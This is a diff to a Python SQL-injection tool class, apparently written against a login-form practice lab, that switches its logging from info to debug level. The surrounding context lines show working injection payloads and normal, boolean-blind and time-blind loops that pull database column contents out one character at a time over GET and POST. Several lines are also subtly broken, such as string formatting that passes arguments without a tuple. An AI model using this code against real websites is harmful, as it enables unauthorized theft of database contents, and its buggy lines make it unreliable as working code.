@@ -22,23 +22,23 @@ class SqliContent(SqliColumns):
     def get_content(self, database_name, table_name, column_name, limits, content=None):
 
         # 开始注内容
-        logger.info("Start sqli table %s column %s limit %d" % table_name, column_name, limits)
+        logger.debug("Start sqli table %s column %s limit %d" % table_name, column_name, limits)
 
         contents = []
         # 先GET
         if self.sqlirequest == "GET":
-            logger.info("The sqlirequest is %s, start sqli content..." % self.sqlirequest)
+            logger.debug("The sqlirequest is %s, start sqli content..." % self.sqlirequest)
 
             if self.sqlimethod == "normal":
 
-                logger.info("The sqlimethod is %s..." % self.sqlimethod)
+                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
 
                 # 注这一条的数据长度
                 payload = "username=a' or SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
                     limits) + ",1%23&passwd=ddog123&submit=Log+In"
                 r = self.Data.GetData(payload)
                 content_len = int(UnpackFunction(r))
-                logger.info("Contents length sqli success...now is limit %d, The content_len is %d..." % limits,
+                logger.debug("Contents length sqli success...now is limit %d, The content_len is %d..." % limits,
                             content_len)
                 contents.append(content_len)
                 # print "[*] content_len: %d" % content_len
@@ -48,7 +48,7 @@ class SqliContent(SqliColumns):
                     limits) + ",1%23&passwd=ddog123&submit=Log+In"
                 r = self.Data.GetData(payload)
                 content = UnpackFunction(r)
-                logger.info("Content sqli success...The content is %d..." % content)
+                logger.debug("Content sqli success...The content is %d..." % content)
                 # 把content return回去，以元组的形式
                 contents.append(content)
                 # print "[*] content: %s" % content
@@ -56,7 +56,7 @@ class SqliContent(SqliColumns):
 
             elif self.sqlimethod == "build":
 
-                logger.info("The sqlimethod is %s..." % self.sqlimethod)
+                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
 
                 # 然后注content 的 length
                 for j in range(0, 30):
@@ -66,7 +66,7 @@ class SqliContent(SqliColumns):
                         content_len = j
                         break
 
-                logger.info("Content length sqli success...The content_len is %d..." % content_len)
+                logger.debug("Content length sqli success...The content_len is %d..." % content_len)
                 # print "[*] content_len: %d" % content_len
                 contents.append(content_len)
 
@@ -80,7 +80,7 @@ class SqliContent(SqliColumns):
                             content += chr(int(k))
                             break
 
-                logger.info("Content sqli success...The content is %d..." % content)
+                logger.debug("Content sqli success...The content is %d..." % content)
                 # 把content插入列表,并以元祖的方式返回
                 contents.append(content)
                 # print "[*] content:" + content
@@ -88,7 +88,7 @@ class SqliContent(SqliColumns):
 
             elif self.sqlimethod == "time":
 
-                logger.info("The sqlimethod is %s..." % self.sqlimethod)
+                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
 
                 # 然后注content 的length
                 for j in range(0, 30):
@@ -99,7 +99,7 @@ class SqliContent(SqliColumns):
                         content_len = j
                         break
 
-                logger.info("Content length sqli success...The content_len is %d..." % content_len)
+                logger.debug("Content length sqli success...The content_len is %d..." % content_len)
                 # print "[*] content_len: %d" % content_len
                 contents.append(content_len)
 
@@ -114,7 +114,7 @@ class SqliContent(SqliColumns):
                             content += chr(int(k))
                             break
 
-                logger.info("Content sqli success...The content is %d..." % content)
+                logger.debug("Content sqli success...The content is %d..." % content)
                 # 把content插入列表
                 contents.append(content)
                 # print "[*] content:" + content
@@ -122,11 +122,11 @@ class SqliContent(SqliColumns):
 
         # 然后是post
         elif self.sqlirequest == "POST":
-            logger.info("The sqlirequest is %s, start sqli contents..." % self.sqlirequest)
+            logger.debug("The sqlirequest is %s, start sqli contents..." % self.sqlirequest)
 
             if self.sqlimethod == "normal":
 
-                logger.info("The sqlimethod is %s..." % self.sqlimethod)
+                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
 
                 # 首先是tablename的长度
                 payload = {
@@ -134,7 +134,7 @@ class SqliContent(SqliColumns):
                         limits) + ",1%23", "passwd": "ddog123&submit=Log+In"}
                 r = self.Data.PostData(payload)
                 content_len = int(UnpackFunction(r))
-                logger.info("Content length sqli success...The content_len is %d..." % content_len)
+                logger.debug("Content length sqli success...The content_len is %d..." % content_len)
                 # print "[*] content_len: %d" % content_len
                 contents.append(content_len)
 
@@ -144,7 +144,7 @@ class SqliContent(SqliColumns):
                         limits) + ",1)%23", "passwd": "ddog123"}
                 r = self.Data.PostData(payload)
                 content = UnpackFunction(r)
-                logger.info("Content sqli success...The content is %d..." % content)
+                logger.debug("Content sqli success...The content is %d..." % content)
                 # 把content插入列表 并返回元组
                 contents.append(content)
                 # print "[*] content: %s" % content
@@ -152,7 +152,7 @@ class SqliContent(SqliColumns):
 
             elif self.sqlimethod == "build":
 
-                logger.info("The sqlimethod is %s..." % self.sqlimethod)
+                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
 
                 # 然后注content 的 length
                 for j in range(0, 30):
@@ -163,7 +163,7 @@ class SqliContent(SqliColumns):
                         content_len = j
                         break
 
-                logger.info("Content length sqli success...The content_len is %d..." % content_len)
+                logger.debug("Content length sqli success...The content_len is %d..." % content_len)
                 # print "[*] content_len: %d" % content_len
                 contents.append(content_len)
 
@@ -177,7 +177,7 @@ class SqliContent(SqliColumns):
                             content += chr(int(k))
                             break
 
-                logger.info("Content sqli success...The content is %d..." % content)
+                logger.debug("Content sqli success...The content is %d..." % content)
                 # 把content插入列表
                 contents.append(content)
                 # print "[*] content:" + content
@@ -185,7 +185,7 @@ class SqliContent(SqliColumns):
 
             elif self.sqlimethod == "time":
 
-                logger.info("The sqlimethod is %s..." % self.sqlimethod)
+                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
 
                 # 然后注content 的length
                 for j in range(0, 30):
@@ -197,7 +197,7 @@ class SqliContent(SqliColumns):
                         content_len = j
                         break
 
-                logger.info("Content length sqli success...The content_len is %d..." % content_len)
+                logger.debug("Content length sqli success...The content_len is %d..." % content_len)
                 # print "[*] content_len: %d" % content_len
                 contents.append(content)
 
@@ -212,10 +212,10 @@ class SqliContent(SqliColumns):
                             content += chr(int(k))
                             break
 
-                logger.info("Content sqli success...The content is %d..." % content)
+                logger.debug("Content sqli success...The content is %d..." % content)
                 # 把content插入列表
                 contents.append(content)
                 # print "[*] content:" + content
                 return tuple(contents)
 
-        logger.info("Sqli table %s column %s limit %d success,,," % table_name, column_name, limits)
+        logger.debug("Sqli table %s column %s limit %d success,,," % table_name, column_name, limits)
